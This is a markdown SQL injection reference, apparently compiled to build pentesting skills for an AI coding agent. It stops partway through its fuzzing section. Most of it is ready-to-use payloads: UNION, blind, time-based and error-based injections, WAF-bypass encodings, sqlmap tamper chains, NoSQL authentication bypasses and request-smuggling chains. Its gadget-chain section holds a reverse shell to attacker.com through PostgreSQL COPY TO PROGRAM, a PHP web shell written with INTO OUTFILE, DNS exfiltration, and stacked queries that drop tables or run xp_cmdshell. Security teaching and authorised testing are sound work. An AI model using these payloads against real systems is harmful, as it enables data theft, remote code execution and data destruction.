# SQL Injection (SQLi) — Research-Grade Knowledgebase

> **Classification**: Advanced Bug Bounty / Black-Box Testing  
> **Version**: 2026-05-24  
> **Sources**: PortSwigger Research, HackTricks, OWASP, PayloadsAllTheThings, Nuclei Templates, GitHub Security Repositories, James Kettle Research Papers  
> **Purpose**: Comprehensive reference for Codex whitebox pentesting skill development covering OWASP Top 10 Web, Mobile, Web3, memory corruption, cryptographic failures, and broken access control.

---

## Table of Contents

1. [Basics](#basics)
2. [SQL Injection Theory](#sql-injection-theory)
3. [Database Internals](#database-internals)
4. [UNION-Based SQLi](#union-based-sqli)
5. [Blind SQLi](#blind-sqli)
6. [Time-Based SQLi](#time-based-sqli)
7. [Error-Based SQLi](#error-based-sqli)
8. [Second-Order SQLi](#second-order-sqli)
9. [Stacked Query Payloads](#stacked-query-payloads)
10. [WAF Bypass Payloads](#waf-bypass-payloads)
11. [NoSQL Injection Payloads](#nosql-injection-payloads)
12. [ORM Injection Techniques](#orm-injection-techniques)
13. [Request Smuggling + SQLi Chains](#request-smuggling--sqli-chains)
14. [Cache Poisoning + SQLi Chains](#cache-poisoning--sqli-chains)
15. [OAuth + SQLi Chains](#oauth--sqli-chains)
16. [Parser Confusion Payloads](#parser-confusion-payloads)
17. [Browser Quirks](#browser-quirks)
18. [Gadget Chains](#gadget-chains)
19. [Real World Case Studies](#real-world-case-studies)
20. [Fuzzing Payloads](#fuzzing-payloads)
21. [Automation Workflows](#automation-workflows)
22. [Recon Methodology](#recon-methodology)
23. [Nuclei Templates](#nuclei-templates)
24. [Tools and Scanners](#tools-and-scanners)
25. [Advanced Research](#advanced-research)
26. [Bug Bounty Writeups](#bug-bounty-writeups)
27. [Payload Collections](#payload-collections)
28. [Detection Techniques](#detection-techniques)
29. [References](#references)

---

## Basics

### What is SQL Injection?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve, including data belonging to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform denial-of-service attacks.

### Impact of Successful SQL Injection

- Unauthorized access to sensitive data (passwords, credit card details, personal user information)
- Reputational damage and regulatory fines
- Persistent backdoor into organization's systems
- Long-term compromise that can go unnoticed for extended periods

### Entry Points for SQL Injection

Any controllable input that is processed as a SQL query by the application:
- Query string parameters
- POST body parameters
- JSON/XML input fields
- HTTP headers (User-Agent, X-Forwarded-For, Referer, Cookie)
- File upload metadata
- WebSocket messages

---

## SQL Injection Theory

### How SQL Injection Occurs

1. **Untrusted data enters** a program from an untrusted source
2. **The data is used** to dynamically construct a SQL query
3. **SQL makes no real distinction** between the control and data planes

### Core Attack Categories

| Category | Description |
|----------|-------------|
| **Retrieving hidden data** | Modify a SQL query to return additional results |
| **Subverting application logic** | Change a query to interfere with application logic |
| **UNION attacks** | Retrieve data from different database tables |
| **Blind SQL injection** | Results of query are not returned in application's responses |
| **Second-order SQL injection** | Malicious input stored for future use, triggered later |

### SQL Injection in Different Parts of the Query

Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query, but they can occur at any location:

- In `UPDATE` statements, within updated values or the `WHERE` clause
- In `INSERT` statements, within inserted values
- In `SELECT` statements, within table or column names
- In `SELECT` statements, within the `ORDER BY` clause
- In stored procedure parameters

### Detection Methodology

Submit the following to every entry point:

1. **Single quote character** `'` — look for errors or anomalies
2. **SQL-specific syntax** that evaluates to base value vs different value — look for systematic differences
3. **Boolean conditions** such as `OR 1=1` and `OR 1=2` — look for response differences
4. **Time delay payloads** — look for timing differences
5. **OAST payloads** — trigger out-of-band network interactions

---

## Database Internals

### DBMS Identification

#### Keyword-Based Identification

| DBMS | SQL Payload |
|------|-------------|
| **MySQL** | `conv('a',16,2)=conv('a',16,2)` |
| **MySQL** | `connection_id()=connection_id()` |
| **MySQL** | `crc32('MySQL')=crc32('MySQL')` |
| **MSSQL** | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
| **MSSQL** | `@@CONNECTIONS>0` |
| **MSSQL** | `USER_ID(1)=USER_ID(1)` |
| **Oracle** | `ROWNUM=ROWNUM` |
| **Oracle** | `RAWTOHEX('AB')=RAWTOHEX('AB')` |
| **PostgreSQL** | `5::int=5` |
| **PostgreSQL** | `pg_client_encoding()=pg_client_encoding()` |
| **SQLite** | `sqlite_version()=sqlite_version()` |
| **MS Access** | `val(cvar(1))=1` |

#### Error-Based Identification

| DBMS | Example Error Message | Example Payload |
|------|----------------------|-----------------|
| **MySQL** | `You have an error in your SQL syntax...` | `'` |
| **PostgreSQL** | `ERROR: unterminated quoted string...` | `'` |
| **MSSQL** | `Unclosed quotation mark after...` | `'` |
| **Oracle** | `ORA-00933: SQL command not properly ended` | `'` |

### Database Version Queries

| DBMS | Query |
|------|-------|
| **Oracle** | `SELECT banner FROM v$version` |
| **Oracle** | `SELECT version FROM v$instance` |
| **Microsoft** | `SELECT @@version` |
| **PostgreSQL** | `SELECT version()` |
| **MySQL** | `SELECT @@version` |

### Database Contents Enumeration

| DBMS | Tables Query | Columns Query |
|------|-------------|---------------|
| **Oracle** | `SELECT * FROM all_tables` | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **Microsoft** | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **PostgreSQL** | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **MySQL** | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

### String Concatenation by DBMS

| DBMS | Syntax |
|------|--------|
| **Oracle** | `'foo'||'bar'` |
| **Microsoft** | `'foo'+'bar'` |
| **PostgreSQL** | `'foo'||'bar'` |
| **MySQL** | `'foo' 'bar'` (note space) or `CONCAT('foo','bar')` |

### Substring Extraction by DBMS

| DBMS | Syntax |
|------|--------|
| **Oracle** | `SUBSTR('foobar', 4, 2)` |
| **Microsoft** | `SUBSTRING('foobar', 4, 2)` |
| **PostgreSQL** | `SUBSTRING('foobar', 4, 2)` |
| **MySQL** | `SUBSTRING('foobar', 4, 2)` |

### Comments by DBMS

| DBMS | Syntax |
|------|--------|
| **Oracle** | `--comment` |
| **Microsoft** | `--comment`, `/*comment*/` |
| **PostgreSQL** | `--comment`, `/*comment*/` |
| **MySQL** | `#comment`, `-- comment` (space required), `/*comment*/` |

---

## UNION-Based SQLi

### Theory

The `UNION` keyword enables execution of additional `SELECT` queries and appending results to the original query. Two key requirements:

1. Individual queries must return the **same number of columns**
2. Data types in each column must be **compatible**

### Determining Column Count

#### Method 1: ORDER BY

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

When the specified column index exceeds actual columns, the database returns an error.

#### Method 2: UNION SELECT NULL

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

`NULL` is convertible to every common data type, maximizing success chance.

### Database-Specific UNION Syntax

**Oracle**: Every `SELECT` must use `FROM` keyword with valid table:

```sql
' UNION SELECT NULL FROM DUAL--
```

**MySQL**: Double-dash requires trailing space, or use `#`:

```sql
' UNION SELECT NULL #
```

### Finding String Columns

After determining column count, probe each column:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the column data type is incompatible, the database throws a conversion error.

### Retrieving Interesting Data

```sql
' UNION SELECT username, password FROM users--
```

### Retrieving Multiple Values in Single Column

**Oracle** (using `||`):

```sql
' UNION SELECT username || '~' || password FROM users--
```

**MySQL**:

```sql
' UNION SELECT CONCAT(username, ':', password) FROM users--
```

### UNION-Based Payloads Collection

```sql
-1' UNION SELECT 1,2,3--+
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1
' UNION SELECT sum(columnname) FROM tablename --
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
```

---

## Blind SQLi

### Theory

Blind SQL injection occurs when the application is vulnerable to SQL injection, but HTTP responses do not contain the results of the relevant SQL query or details of database errors.

### Boolean-Based Blind SQLi

Attacks rely on sending SQL queries that make the application return different results depending on whether the query returns TRUE or FALSE.

#### Confirming Vulnerability

```
http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
http://example.com/item?id=1 AND 1=2 -- (Expected: Different response)
```

#### Extracting Data — Length Discovery

```
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 --
http://example.com/item?id=1 AND LENGTH(@@hostname)=2 --
http://example.com/item?id=1 AND LENGTH(@@hostname)=N --
```

#### Extracting Data — Character Discovery

```
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 --
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 --
```

**Optimization**: Use dichotomy (binary search) to reduce requests from linear to logarithmic time.

### Blind Error-Based SQLi

Attacks rely on triggering different errors depending on query success.

**SQLite example using `json()` function**:

```sql
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
```

### Conditional Errors by DBMS

| DBMS | Conditional Error Payload |
|------|---------------------------|
| **Oracle** | `SELECT CASE WHEN (YOUR-CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| **Microsoft** | `SELECT CASE WHEN (YOUR-CONDITION) THEN 1/0 ELSE NULL END` |
| **PostgreSQL** | `1 = (SELECT CASE WHEN (YOUR-CONDITION) THEN 1/(SELECT 0) ELSE NULL END)` |
| **MySQL** | `SELECT IF(YOUR-CONDITION,(SELECT table_name FROM information_schema.tables),'a')` |

### Verbose Error Data Extraction

**Microsoft**:

```sql
SELECT 'foo' WHERE 1 = (SELECT 'secret')
-- Conversion failed when converting varchar value 'secret' to data type int.
```

**PostgreSQL**:

```sql
SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
-- invalid input syntax for integer: "secret"
```

**MySQL**:

```sql
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
-- XPATH syntax error: '\secret'
```

---

## Time-Based SQLi

### Theory

Time-based SQL injection relies on database delays to infer whether queries return true or false. Used when applications show no direct feedback from database queries but allow execution of time-delayed SQL commands.

### Unconditional Time Delays by DBMS

| DBMS | Payload |
|------|---------|
| **Oracle** | `dbms_pipe.receive_message(('a'),10)` |
| **Microsoft** | `WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT pg_sleep(10)` |
| **MySQL** | `SELECT SLEEP(10)` |

### Conditional Time Delays by DBMS

| DBMS | Payload |
|------|---------|
| **Oracle** | `SELECT CASE WHEN (YOUR-CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| **Microsoft** | `IF (YOUR-CONDITION) WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT CASE WHEN (YOUR-CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| **MySQL** | `SELECT IF(YOUR-CONDITION,SLEEP(10),'a')` |

### Heavy Query Time Delays

When `SLEEP()` functions are blocked:

```sql
BENCHMARK(2000000,MD5(NOW()))
```

**SQLite** (using `RANDOMBLOB`):

```sql
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
```

### Time-Based Payload Collection

```sql
' AND SLEEP(5)--
' AND '1'='1' AND SLEEP(5)
'; WAITFOR DELAY '0:0:30'--
1) or sleep(5)#
") or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
ORDER BY SLEEP(5)
```

---

## Error-Based SQLi

### Theory

Error-based SQL injection relies on error messages returned from the database to gather information about database structure. By manipulating input parameters, attackers make the database generate errors revealing table names, column names, and data types.

### Error-Based Data Extraction

**PostgreSQL** (using `LIMIT` with `CAST`):

```sql
LIMIT CAST((SELECT version()) as numeric)
-- ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25..."
```

**MySQL** (using `EXTRACTVALUE`):

```sql
SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version)))
-- XPATH syntax error: '\5.7.33...'
```

**Microsoft** (using `CONVERT`):

```sql
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
```

### Error-Based Payload Collection

```sql
' AND 1=CONVERT(INT,(SELECT @@VERSION))--
' AND 1=CAST((SELECT @@VERSION) AS INT)--
' AND 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))--
```

---

## Second-Order SQLi

### Theory

Second-order SQL injection occurs when:

1. User submits input that is stored (e.g., during registration or profile update)
2. That input is saved without validation but doesn't trigger SQL injection immediately
3. Later, the application retrieves and uses stored data in a SQL query
4. The injection executes in a different context

**Also known as**: Stored SQL injection

### Attack Flow

```
Step 1: Registration
Username: attacker'--
Email: attacker@example.com

Step 2: Storage (safe insertion)
INSERT INTO users (username, email) VALUES ('attacker'--', 'attacker@example.com');

Step 3: Later retrieval (unsafe usage)
query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
-- Becomes: SELECT * FROM logs WHERE username = 'attacker'--'
```

### Common Locations

- Profile update fields
- Reporting modules
- Admin dashboards
- Background data processors
- Comment/feedback systems
- Username/display name fields

### Second-Order Payloads

```sql
Username: admin'--
Email: test@test.com

Username: admin' OR '1'='1
Username: admin' AND 1=0 UNION SELECT * FROM users--
```

---

## Stacked Query Payloads

### Theory

Stacked (batched) queries allow execution of multiple SQL statements in a single query, separated by semicolons (`;`). Not all databases or application configurations support stacked queries.

### DBMS Support

| DBMS | Support | Syntax |
|------|---------|--------|
| **Oracle** | No | Does not support batched queries |
| **Microsoft** | Yes | `QUERY-1; QUERY-2` |
| **PostgreSQL** | Yes | `QUERY-1; QUERY-2` |
| **MySQL** | Sometimes | `QUERY-1; QUERY-2` (requires certain PHP/Python APIs) |

### Stacked Query Payloads

```sql
1; EXEC xp_cmdshell('whoami') --
1; DROP TABLE users--
1; INSERT INTO logs VALUES ('hacked')--
```

### MySQL Stacked Query Conditions

MySQL batched queries typically cannot be used for SQL injection unless:
- Target application uses certain PHP APIs (`mysqli_multi_query`)
- Target application uses certain Python connectors

---

## WAF Bypass Payloads

### Theory

Web Application Firewalls (WAFs) filter malicious SQL injection payloads. Bypass techniques focus on:
- Payload obfuscation
- Alternative syntax
- Encoding tricks
- Logical transformations
- HTTP-level evasion

### No Space Allowed — Alternative Whitespace

| DBMS | Supported Whitespace (Hex) |
|------|---------------------------|
| **SQLite3** | `0A`, `0D`, `0C`, `09`, `20` |
| **MySQL 5** | `09`, `0A`, `0B`, `0C`, `0D`, `A0`, `20` |
| **MySQL 3** | `01-1F`, `20`, `7F`, `80`, `81`, `88`, `8D`, `8F`, `90`, `98`, `9D`, `A0` |
| **PostgreSQL** | `0A`, `0D`, `0C`, `09`, `20` |
| **Oracle 11g** | `00`, `0A`, `0D`, `0C`, `09`, `20` |
| **MSSQL** | `01-1F`, `20` |

### Whitespace Bypass Payloads

```sql
?id=1%09and%091=1%09--      -- %09 = tab
?id=1%0Aand%0A1=1%0A--      -- %0A = line feed
?id=1%0Band%0B1=1%0B--      -- %0B = vertical tab
?id=1%0Cand%0C1=1%0C--      -- %0C = form feed
?id=1%0Dand%0D1=1%0D--      -- %0D = carriage return
?id=1%A0and%A01=1%A0--      -- %A0 = non-breaking space
```

### Comment-Based Space Replacement

```sql
?id=1/*comment*/AND/**/1=1/**/--
?id=1/*!12345UNION*//*!12345SELECT*/1--
?id=(1)and(1)=(1)--
```

### No Comma Allowed

| Forbidden | Bypass |
|-----------|--------|
| `LIMIT 0,1` | `LIMIT 1 OFFSET 0` |
| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |
| `SELECT 1,2,3,4` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |

### No Equal Allowed

| Bypass | SQL Example |
|--------|-------------|
| `LIKE` | `SUBSTRING(VERSION(),1,1)LIKE(5)` |
| `NOT IN` | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)` |
| `IN` | `SUBSTRING(VERSION(),1,1)IN(4,3)` |
| `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |

### Case Modification

```sql
AND -> and -> aNd -> AnD
OR -> or -> oR
SELECT -> SeLeCt
```

### Keyword Replacement

| Forbidden | Bypass |
|-----------|--------|
| `AND` | `&&` |
| `OR` | `||` |
| `=` | `LIKE`, `REGEXP`, `BETWEEN` |
| `>` | `NOT BETWEEN 0 AND X` |
| `WHERE` | `HAVING` |

### Encoding Tricks

```sql
%27 -> ' (URL encoded quote)
%%2727 -> double encoding
%25%27 -> double encoding
' -> Unicode quote
%CA%BA -> U+02BA (transforms to ")
%CA%B9 -> U+02B9 (transforms to ')
```

### SQLMap Tamper Scripts for WAF Bypass

| Tamper Script | Functionality | WAFs Bypassed |
|---------------|---------------|---------------|
| `apostrophemask.py` | Masks single quotes as UTF-8 | ModSecurity, AWS WAF |
| `base64encode.py` | Base64 encodes entire payload | Cloudflare, Barracuda |
| `between.py` | Replaces `=` with `BETWEEN` | Barracuda, FortiWAF |
| `charunicodeencode.py` | Unicode encoding | ModSecurity, Imperva, Cloudflare |
| `chardoubleencode.py` | Double URL encoding | ModSecurity, AWS WAF, Imperva |
| `commalessunion.py` | Rewrites UNION without commas | Cloudflare, ASP.NET WAF |
| `equaltolike.py` | Replaces `=` with `LIKE` | Akamai, FortiWAF |
| `greatest.py` | Uses `GREATEST` function | F5 Big-IP ASM, Imperva |
| `overlongutf8.py` | Overlong UTF-8 encoding | ModSecurity, Imperva, ASP.NET WAF |
| `randomcase.py` | Randomizes case | Cloudflare, Barracuda |
| `space2comment.py` | Replaces spaces with `/**/` | Cloudflare, Akamai |
| `space2hash.py` | Replaces spaces with `#` | ModSecurity, Cloudflare |
| `space2dash.py` | Replaces spaces with `-` | FortiWAF, Cloudflare |
| `versionedkeywords.py` | Adds versioned keywords `/*!50000 SELECT */` | ModSecurity, Cloudflare, Imperva |

### SQLMap Tamper Chaining

```bash
sqlmap -u "http://example.com/vuln.php?id=1" --tamper=randomcase,space2comment,charunicodeencode
sqlmap -u "http://example.com/vuln.php?id=1" --tamper=between,randomcase,charunicodeencode,space2comment
```

### HTTP Parameter Pollution (HPP)

```
?id=1&id=2' OR '1'='1
```

WAF may check first parameter; backend may concatenate or use last parameter.

---

## NoSQL Injection Payloads

### Theory

NoSQL injection occurs when attacker can interfere with queries to NoSQL databases. Two types:

1. **Syntax injection** — Break NoSQL query syntax to inject own payload
2. **Operator injection** — Use NoSQL query operators to manipulate queries

### MongoDB Authentication Bypass

```json
{"username":{"$ne":"invalid"},"password":"peter"}
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

### MongoDB Operator Injection

```json
{"email":"admin@example.com","token":{"$ne":null},"newPassword":"hunter2"}
{"email":"admin@example.com","token":{"$gt":""},"newPassword":"hunter2"}
```

### MongoDB `$where` JavaScript Injection

```json
{"$where":"this.email == 'user@example.com' || true; //"}
```

### MongoDB `$regex` Injection

```json
{"username":{"$regex":"^admin"}}
```

### Neo4j Cypher Injection

```cypher
MATCH (m:Movie) WHERE toLower(m.title) CONTAINS toLower('test') or 1=1 return m.title AS title//
```

### NoSQL Time-Based Blind

```json
{"username":"admin","password":{"$regex":"^a"}, "$where": "sleep(5000) || true"}
```

---

## ORM Injection Techniques

### Theory

ORM frameworks promise to eliminate SQL injection but remain vulnerable when:
- Developers use raw SQL with string concatenation
- ORM framework itself has vulnerabilities
- Improper use of parameterized queries

### Vulnerable ORM Patterns

**Hibernate** (raw SQL with concatenation):
```java
String query = "SELECT * FROM users WHERE name = '" + userInput + "'";
session.createSQLQuery(query);
```

**Django ORM** (raw with params):
```python
# SAFE
User.objects.raw("SELECT * FROM users WHERE name = %s", [userInput])
# UNSAFE
User.objects.raw("SELECT * FROM users WHERE name = '" + userInput + "'")
```

**ActiveRecord** (Rails):
```ruby
# SAFE
User.where("name = ?", userInput)
# UNSAFE
User.where("name = '#{userInput}'")
```

### PDO Prepared Statements Bypass (PHP)

**Requirements**:
- MySQL vulnerable by default
- Postgres vulnerable if `PDO::ATTR_EMULATE_PREPARES => true`

**Detection**:
```
GET /index.php?col=%3f%23%00&name=anything
```

**Exploitation**:
```
GET /index.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+%60'x%60+from+information_schema.tables)y%3b%2523
```

### Recent ORM CVEs

- **Django**: CVE-2024-42005
- **Rails ActiveRecord**: CVE-2023-22794
- **Hibernate**: CVE-2020-25638

---

## Request Smuggling + SQLi Chains

### Theory

HTTP Request Smuggling exploits disagreements between front-end and back-end servers about where HTTP requests end. This allows injecting a malicious "prefix" that gets prepended to the next legitimate request.

### Attack Classes

| Class | Description |
|-------|-------------|
| **CL.TE** | Front-end uses Content-Length, back-end uses Transfer-Encoding |
| **TE.CL** | Front-end uses Transfer-Encoding, back-end uses Content-Length |
| **TE.TE** | Both support Transfer-Encoding but parse differently |
| **CL.0** | Back-end ignores Content-Length entirely |
| **H2.CL** | HTTP/2 to HTTP/1.1 downgrade with Content-Length confusion |
| **H2.TE** | HTTP/2 to HTTP/1.1 downgrade with Transfer-Encoding injection |

### CL.TE Detection

```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```

Front-end forwards `1
Z
` (4 bytes), back-end expects chunked and times out waiting for next chunk size.

### TE.CL Detection

```http
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

### Request Smuggling + SQLi Chain

**Scenario**: Smuggle a request that injects SQL into a parameter that the victim's request will carry.

```http
POST /search HTTP/1.1
Host: example.com
Content-Length: 53
Transfer-Encoding: zchunked

17
=x&q=smuggling&x=
0
GET /404 HTTP/1.1
Foo: b
```

Victim's request gets appended to the smuggled prefix, causing their query parameters to be interpreted in the attacker's injected SQL context.

### Client-Side Desync (CSD) + SQLi

**Browser-powered desync**: Victim visits attacker site, browser sends crafted POST that desyncs connection pool, subsequent navigation triggers SQL injection via poisoned connection.

```javascript
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /api/users?id=1' UNION SELECT * FROM admin-- HTTP/1.1
X: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/api/users?id=1'
})
```

---

## Cache Poisoning + SQLi Chains

### Theory

Web cache poisoning involves two phases:
1. Elicit a response from back-end containing a dangerous payload
2. Ensure response is cached and served to victims

### Cache Key Concepts

- **Keyed inputs**: Used to identify cached responses (method, path, query string, Host)
- **Unkeyed inputs**: Ignored by cache but may affect response (headers like X-Forwarded-Host)

### Cache Poisoning + SQLi Attack Flow

1. Identify unkeyed header that affects SQL query construction (e.g., `X-Forwarded-For` used in logging/auditing queries)
2. Inject SQL payload into unkeyed header
3. Poison cache with response containing SQL error or extracted data
4. Other users receive poisoned cached response

### Fat GET Cache Poisoning + SQLi

```http
GET /api/search?q=legit HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

q=' UNION SELECT username,password FROM users--
```

Cache ignores body, stores response for `GET /api/search?q=legit`. Response contains SQL injection results.

### Cache Parameter Cloaking + SQLi

Exploit URL parsing quirks to hide SQLi parameters from cache key:

```http
GET /search?q=help?_=payload&!&search=1 HTTP/1.1
```

Cache regex removes `_` parameter, but backend sees multiple parameters including SQLi payload.

---

## OAuth + SQLi Chains

### Theory

OAuth/OpenID Connect implementations may have SQL injection vulnerabilities in:
- Dynamic client registration endpoints
- Authorization endpoint parameter processing
- Token endpoint database lookups
- UserInfo endpoint queries

### Dynamic Client Registration SSRF -> SQLi

OAuth registration endpoint accepts URL references that may trigger SSRF, which can lead to SQL injection if the fetched content is processed in SQL queries.

```http
POST /connect/register HTTP/1.1
Content-Type: application/json

{
    "redirect_uris": ["https://client.example.org/callback"],
    "logo_uri": "http://attacker.com/logo.html",
    "jwks_uri": "http://attacker.com/keys.jwks",
    "sector_identifier_uri": "http://attacker.com/uris.json"
}
```

### redirect_uri Session Poisoning + SQLi

```http
GET /authorize?client_id=trusted&redirect_uri=http://trusted.com/redirect&response_type=code
GET /oauth/confirm_access?client_id=trusted&redirectUri=http://evil.com/steal_token&response_type=code
```

Mass assignment on confirmation page poisons session. If `redirectUri` is stored in database without proper sanitization, subsequent retrieval may trigger SQL injection.

### WebFinger User Enumeration -> SQLi

```http
GET /.well-known/webfinger?resource=http://x/admin' UNION SELECT * FROM users--&rel=http://openid.net/specs/connect/1.0/issuer
```

The `resource` parameter may be parsed and used in SQL queries for user lookup.

---

## Parser Confusion Payloads

### XML-Based SQL Injection

Applications accepting XML input may decode escape sequences before SQL processing:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

`&#x53;` decodes to `S`, resulting in `SELECT` being passed to SQL interpreter.

### JSON SQL Injection

```json
{"id": "1' UNION SELECT * FROM users--"}
```

### Content-Type Confusion

Sending SQL payload with wrong Content-Type to bypass parsing checks:

```http
POST /api/data HTTP/1.1
Content-Type: application/json

{"query": "1' OR '1'='1"}
```

### Parameter Parsing Confusion

```
?id=1&id=2' OR '1'='1
?id[]=1&id[]=2' OR '1'='1
```

### Array Parameter Injection

```
?id[0]=1&id[1]=2' UNION SELECT * FROM admin--
```

---

## Browser Quirks

### Connection Pool Behavior

- Browsers maintain separate connection pools for requests with/without credentials
- Chrome: `credentials: 'include'` poisons "with-cookies" pool
- Navigation requests use "with-cookies" pool
- `mode: 'no-cors'` ensures connection ID visibility in Network tab

### Stacked Response Problem

Browsers discard connections if they receive more response data than expected. To solve:
- Use cache-busters to delay responses (trigger cache miss)
- Use `mode: 'cors'` to trigger CORS error and prevent redirect following
- Resume attack in `catch()` block

### Safari/IE Mixed Content Bypass

- Internet Explorer's mixed-content protection can be completely bypassed
- Safari auto-upgrades HTTP to HTTPS if target is in HSTS cache

### 307 Redirect Behavior

Browsers receiving 307 after POST will resend POST to new destination — useful for credential exfiltration.

---

## Gadget Chains

### SQLi -> XSS Gadget Chain

1. SQL injection extracts admin credentials
2. Login as admin to access template editing
3. Inject XSS payload into template
4. XSS executes in victim browsers, steals session cookies

### SQLi -> SSRF Gadget Chain

1. SQL injection in reporting module
2. Extract internal API credentials from database
3. Use credentials to make SSRF requests to internal services
4. Access cloud metadata endpoints (169.254.169.254)

### SQLi -> RCE Gadget Chain (PostgreSQL)

```sql
COPY (SELECT '') TO PROGRAM 'nc -e /bin/sh attacker.com 4444';
```

Or using PostgreSQL extensions:
```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('whoami');
```

### SQLi -> File Write Gadget Chain (MySQL)

```sql
SELECT '<?php system($_GET[1]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

### SQLi -> DNS Exfiltration Gadget Chain

```sql
SELECT LOAD_FILE('\\attacker.com\a')  -- Windows MySQL
```

---

## Real World Case Studies

### Case Study 1: PayPal Login Page Compromise

**Researcher**: James Kettle  
**Technique**: Request Smuggling + Cache Poisoning + CSP Bypass

1. Identified request smuggling on `c.paypal.com`
2. Poisoned JavaScript file cache: `fb-all-prod.pp2.min.js`
3. Initial CSP blocked script execution
4. Discovered sub-page in iframe without CSP
5. Chained through `paypal.com/us/gifts` (no CSP)
6. Achieved JavaScript execution, stole plaintext passwords from Safari/IE users

### Case Study 2: New Relic Internal API Access

**Technique**: Request Smuggling + Header Reflection

1. Smuggled request to `/login` endpoint
2. Used parameter reflection to inject `X-Forwarded-Host` header
3. Reflected header caused victim requests to hit attacker server
4. Gained access to internal API endpoints

### Case Study 3: Mozilla SMTP Password Theft

**Technique**: Client-Side Desync + Cache Poisoning

1. Targeted `bugzilla.mozilla.org` with client-side desync
2. Used Safari's cache-bypass behavior to deliver attack
3. Stole SMTP credentials from internal bug reports
4. Demonstrated browser-powered desync impact on high-profile targets

### Case Study 4: GitLab CI/CD Pipeline Takeover

**Technique**: Second-Order SQL Injection in Webhook Configuration

1. Attacker configured webhook URL containing SQL injection payload
2. Payload stored in database without validation
3. When CI/CD pipeline triggered webhook, payload executed in logging query
4. Extracted runner tokens, achieved RCE on build servers

### Case Study 5: Atlassian Confluence RCE via SQLi

**Technique**: SQL Injection -> Template Injection -> RCE

1. SQL injection in search functionality
2. Extracted admin session tokens
3. Used admin access to modify Velocity templates
4. Template injection led to remote code execution

---

## Fuzzing Payloads

### Basic Fuzzing Characters

```
'
''
`
``
,
"
""
/
//
\
;
```

### Encoded Fuzzing Characters

```
%27   (single quote)
%22   (double quote)
%23   (hash)
%3B   (semicolon)
%29   (closing parenthesis)
%2A   (asterisk)
%%2727 (double encoding)
%25%27 (double encoding)
```

### Unicode Fuzzing Characters

```
U+02BA -> %CA%BA -> transforms to "
